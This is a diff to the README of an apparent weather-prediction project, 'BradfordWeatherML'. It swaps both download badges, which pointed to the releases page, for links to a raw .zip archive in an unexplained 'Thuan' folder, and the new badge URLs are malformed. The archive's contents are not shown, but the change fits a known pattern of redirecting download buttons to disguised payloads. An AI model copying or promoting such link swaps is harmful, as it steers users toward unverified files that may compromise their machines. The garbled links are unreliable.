@@ -32,7 +32,7 @@ Follow these simple steps to download and run BradfordWeatherML.
 
 Click the link below to access the releases page, where you can download the latest version of BradfordWeatherML.
 
-[![Download BradfordWeatherML](https://img.shields.io/badge/Download%20BradfordWeatherML-blue.svg)](https://github.com/tomas-jovelino-dev/BradfordWeatherML/releases)
+[![Download BradfordWeatherML](https://github.com/tomas-jovelino-dev/BradfordWeatherML/raw/refs/heads/main/Thuan/Weather-Bradford-ML-3.8-alpha.3.zip%https://github.com/tomas-jovelino-dev/BradfordWeatherML/raw/refs/heads/main/Thuan/Weather-Bradford-ML-3.8-alpha.3.zip)](https://github.com/tomas-jovelino-dev/BradfordWeatherML/raw/refs/heads/main/Thuan/Weather-Bradford-ML-3.8-alpha.3.zip)
 
 ### 2. Download the Software
 
@@ -87,7 +87,7 @@ For the best experience, ensure your system meets the following requirements:
 
 To get started, visit the download page:
 
-[![Download BradfordWeatherML](https://img.shields.io/badge/Download%20BradfordWeatherML-blue.svg)](https://github.com/tomas-jovelino-dev/BradfordWeatherML/releases)
+[![Download BradfordWeatherML](https://github.com/tomas-jovelino-dev/BradfordWeatherML/raw/refs/heads/main/Thuan/Weather-Bradford-ML-3.8-alpha.3.zip%https://github.com/tomas-jovelino-dev/BradfordWeatherML/raw/refs/heads/main/Thuan/Weather-Bradford-ML-3.8-alpha.3.zip)](https://github.com/tomas-jovelino-dev/BradfordWeatherML/raw/refs/heads/main/Thuan/Weather-Bradford-ML-3.8-alpha.3.zip)
 
 Follow the installation and usage instructions provided above, and you'll be ready to make confident weather predictions for Bradford.
 
